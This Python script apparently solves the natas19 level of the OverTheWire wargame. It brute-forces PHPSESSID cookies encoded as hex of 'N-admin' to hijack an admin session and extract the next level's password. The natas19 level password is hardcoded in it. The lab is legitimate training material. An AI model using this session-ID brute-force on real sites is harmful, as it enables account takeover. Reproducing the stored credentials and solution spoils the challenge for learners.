import requests
import re

def convert(number):
    set_string = str(number) + "-" + "admin"
    encoding = set_string.encode('utf-8')
    hex_string = encoding.hex()
    return hex_string

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    print("Brute-Forcing cookies again. Patience...")
    for number in range(0,641):
        hex_string = convert(number)
        cookie = {
                "Cookie":"PHPSESSID=" + hex_string
                }
        site = requests.get(url + "index.php",auth=(username,password),headers=cookie)
        if "regular user" in site.text:
            continue
        else:
            flag = re.findall("Password:(.*)</pre>",site.text)
            print("The flag for natas19 is: " + flag[0].strip())
            break

if __name__=="__main__":
    url = "http://natas19.natas.labs.overthewire.org/"
    username = "natas19"
    password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"
    flag(url,username,password)